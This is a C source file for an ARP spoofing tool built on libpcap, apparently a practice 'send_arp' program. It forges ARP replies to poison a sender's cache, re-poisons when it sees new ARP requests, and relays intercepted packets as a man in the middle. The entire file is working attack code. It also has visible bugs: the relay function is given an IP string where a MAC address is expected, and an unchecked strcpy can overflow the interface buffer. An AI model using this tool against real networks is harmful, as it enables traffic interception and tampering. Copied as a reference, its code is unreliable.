#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <unistd.h>
#include "arpspoof.h"

#define ERRBUF_SIZE 4096
#define ETH_HDR_SIZE 14
#define ARP_HDR_SIZE 28

int32_t main(int argc, char ** argv)
{
    if(argc != 4){
        printf("usage : send_arp <network interface> <sender ip> <target ip>\n");
        exit(0);
    }

    uint32_t myIP;
    pcap_t * packet_handle;
    uint8_t AttackerMACAddr[MACADDR_LEN];
    uint8_t SenderMACAddr[MACADDR_LEN];
    uint8_t TargetMACAddr[MACADDR_LEN];
    uint8_t dev[20];
    uint8_t errbuf[ERRBUF_SIZE];


    memset(dev, 0, sizeof(dev));
    strcpy(dev, argv[1]);
    printf("network interface : %s\n", dev);
    if(dev == NULL) print_error("couldn't find device", errbuf);

    GetMyIP(&myIP, dev);
    GetMyMac(AttackerMACAddr, dev);

    packet_handle = pcap_open_live(dev, ERRBUF_SIZE, 1, 1, errbuf); //packet handle, maximun 4096 bytes, 200 ms time limit
    if(packet_handle == NULL) print_error("cannot get packet handle", errbuf);

    SendARP(packet_handle, AttackerMACAddr, TargetMACAddr, myIP, argv[3], ARPOP_REQUEST);
    SendARP(packet_handle, AttackerMACAddr, SenderMACAddr, myIP, argv[2], ARPOP_REQUEST);
    SendARP(packet_handle, AttackerMACAddr, SenderMACAddr, inet_addr(argv[3]), argv[2], ARPOP_REPLY);
    while(1){
        const uint8_t * packet;
        struct pcap_pkthdr * header;
        int res = pcap_next_ex(packet_handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;
        if(IsBroadCasting(packet, argv[2], argv[3])) {
            puts("Alarm : Broadcasting has been detected");
            puts("--------------------------------------");
            SendARP(packet_handle, AttackerMACAddr, SenderMACAddr, inet_addr(argv[3]), argv[2], ARPOP_REPLY);
        }
        if(IsNormalPacket(packet, AttackerMACAddr, SenderMACAddr)){
            uint32_t i ;
            puts("Alarm : Relay");
            printf("from    %s     to      %s\n---------------------------\n", argv[2], argv[3]);
            Maniupulation(packet, AttackerMACAddr, argv[3]);
            pcap_inject(packet_handle, packet, header->len);
        }
    }

    pcap_close(packet_handle);
    return 0;
}

uint32_t IsBroadCasting(uint8_t * packet, uint8_t * senderIP, uint8_t * targetIP){
    uint32_t sIP = ntohl(inet_addr(senderIP));
    uint32_t tIP = ntohl(inet_addr(targetIP));
    uint32_t packetsrcIP, packetdstIP;
    memcpy(&packetsrcIP, packet + SRC_IP_OFFSET, 4);
    memcpy(&packetdstIP, packet + DST_IP_OFFSET, 4);
    packetsrcIP = ntohl(packetsrcIP);
    packetdstIP = ntohl(packetdstIP);

    if(!memcmp(packet + ETH_PROTOCOLTYPE_OFFSET, "\x08\x06", 2) && !memcmp(packet + ARPOP_OFFSET, "\x00\x01", 2)
            && (!memcmp(&packetsrcIP, &sIP, 4) || !memcmp(&packetsrcIP, &tIP, 4))){
        return 1;
    }
    else return 0;
}

uint32_t IsNormalPacket(uint8_t * packet, uint8_t * AttackerMACAddr, uint8_t * SenderMACAddr){
    uint32_t packetsrcIP, i;
    memcpy(&packetsrcIP, packet + SRC_IP_OFFSET, 4);
    packetsrcIP = ntohl(packetsrcIP);

    if(!memcmp(packet + ETH_SRC_MAC_OFFSET, SenderMACAddr, MACADDR_LEN) && !memcmp(packet + ETH_DST_MAC_OFFSET, AttackerMACAddr, MACADDR_LEN)) {
        puts("Normal Packet\n");
        printf("SRC MAC : ");
        for(i = 0; i< 6; i++) printf("%02X ", *(packet + ETH_SRC_MAC_OFFSET + i));
        puts("");
        printf("DST MAC : ");
        for(i = 0; i<6; i++) printf("%02X ", *(packet + ETH_DST_MAC_OFFSET + i));
        puts("");
        puts("\n-----------------------------------------------------------------");
        return 1;
    }
    else return 0;
}

void Maniupulation(uint8_t * packet, uint8_t * myMACAddr, uint8_t * TargetMACAddr){
    memcpy(packet + ETH_SRC_MAC_OFFSET, myMACAddr, MACADDR_LEN);
    memcpy(packet + ETH_DST_MAC_OFFSET, TargetMACAddr, MACADDR_LEN);
    puts("Manipulation has been succeeded");
}

void print_error(uint8_t * errorPoint, uint8_t * errorBuf){
    if(errorBuf == NULL) fprintf(stderr, "<<<< %s >>>> \n", errorPoint);
    else fprintf(stderr, "<<<< %s >>>> \n%s", errorPoint, errorBuf);
    exit(1);
}

void make_ether_header(struct ether_header * ether_header, uint8_t * dest, uint8_t * source, uint16_t type){
        memcpy(ether_header->ether_dhost, dest, 6);
        memcpy(ether_header->ether_shost, source, 6);

        ether_header->ether_type = htons(type);
}

void make_arp_header(struct ether_arp * ether_arp, uint8_t * sha, uint32_t spa, uint8_t * tha, uint32_t tpa, uint32_t op){
        ether_arp->arp_op = htons(op);
        ether_arp->arp_pro = ntohs(ETHERTYPE_IP);
        ether_arp->arp_hrd = ntohs(1);
        ether_arp->arp_hln = 6;
        ether_arp->arp_pln = 4;

        memcpy(ether_arp->arp_sha, sha, 6);
        ether_arp->arp_spa = spa;
        ether_arp->arp_tpa = tpa;

        if(tha != NULL) memcpy(ether_arp->arp_tha, tha, 6);
        else memset(ether_arp->arp_tha, 0x00, 6);
}

void GetMyMac(uint8_t * MacAddr, uint8_t * interface){
    int nSD;
    struct ifreq sIfReq;
    struct if_nameindex * pIfList;

    pIfList= (struct if_nameindex *)NULL;

    if((nSD = socket(PF_INET, SOCK_STREAM, 0)) < 0){
        print_error("Socket descriptor allocation failed\n", NULL);
    }

    pIfList = if_nameindex();
    for(; *(char*)pIfList != 0; pIfList++){
        if(!strcmp(pIfList->if_name, interface)){
            uint32_t a;
            strncpy(sIfReq.ifr_name, pIfList->if_name, IF_NAMESIZE);
            if(ioctl(nSD, SIOCGIFHWADDR, &sIfReq) !=0){
                print_error("failed in ioctl while getting mac address\n", NULL);
            }
            memcpy(MacAddr, (&sIfReq.ifr_ifru.ifru_hwaddr.sa_data), 6);
            printf("Attacker MAC address : ");
            for(a = 0; a < 6; a = a + 1) {
                printf("%02X",  MacAddr[a]);
                if(a < 5) putchar(':');
            }
            puts("");
        }
    }

}

void GetMyIP(uint32_t * myIP, uint8_t * interface){
    struct ifreq ifr;
    char tmpIP[100];
    int s;
    s = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, interface, IF_NAMESIZE);

    if(ioctl(s, SIOCGIFADDR, &ifr) < 0){
        print_error("failed in ioctl while getting my IP Addr", NULL);
    }
    else{
        inet_ntop(AF_INET, ifr.ifr_addr.sa_data + 2, tmpIP, sizeof(struct sockaddr));
        printf("Attacker addr : %s\n", tmpIP);
        *myIP = inet_addr(tmpIP);
    }
}

void SendARP(pcap_t * packet_handle, uint8_t * srcMAC, uint8_t * dstMAC,
        uint32_t srcIP, uint8_t * dstIP, int ARPop){
    struct arp_packet arpPacket;
    uint8_t BrdcastMAC[6] = BROADCASTING_MAC;
    uint8_t UnknownMAC[6] = UNKNOWN_MAC;
    uint32_t idstIP = inet_addr(dstIP);
    uint32_t* buf[ETH_HDR_SIZE + ARP_HDR_SIZE];

    make_ether_header(&(arpPacket.ether_header), (ARPop == ARPOP_REQUEST ? BrdcastMAC : dstMAC), srcMAC, ETHERTYPE_ARP);
    make_arp_header(&(arpPacket.ether_arp), srcMAC, srcIP, (ARPop == ARPOP_REQUEST ? UnknownMAC : dstMAC), idstIP, ARPop);

    memcpy(buf, &arpPacket, ETH_HDR_SIZE + ARP_HDR_SIZE);

    if(ARPop == ARPOP_REQUEST){
        struct pcap_pkthdr* header;
        const uint8_t * packet;
        uint32_t cnt = 0;
        pcap_inject(packet_handle, buf, ETH_HDR_SIZE + ARP_HDR_SIZE);
        while(1){
            pcap_next_ex(packet_handle, &header, &packet);
            if(IsReply(packet, idstIP, dstMAC)){
                int a;

                printf("MAC Address of %s ", dstIP);
                for(a = 0; a < 6; a = a + 1) {
                    printf("%02X", dstMAC[a]);
                    if(a < 5) putchar(':');
                }
                puts("");
                break;
            }
            cnt++;
            if(cnt == 10){
                print_error("Cannot receive reply packet", NULL);
            }
        }
    }
    else pcap_inject(packet_handle, buf, ETH_HDR_SIZE + ARP_HDR_SIZE);
}

uint32_t IsReply(const uint8_t * packet, uint32_t idstIP, uint8_t * dstMAC){
    int a;
    if(packet[ETH_PROTOCOLTYPE_OFFSET] == 0x08 && packet[ETH_PROTOCOLTYPE_OFFSET + 1] == 0x06 && packet[ARPOP_OFFSET] == 0x00 && packet[ARPOP_OFFSET+1] == 0x02
            && !memcmp(&idstIP, packet + SRC_IP_OFFSET, 4)){
        for(a = 0; a < 6; a = a + 1) dstMAC[a] = packet[ETH_SRC_MAC_OFFSET + a];
        return 1;
    }
    else return 0;
}
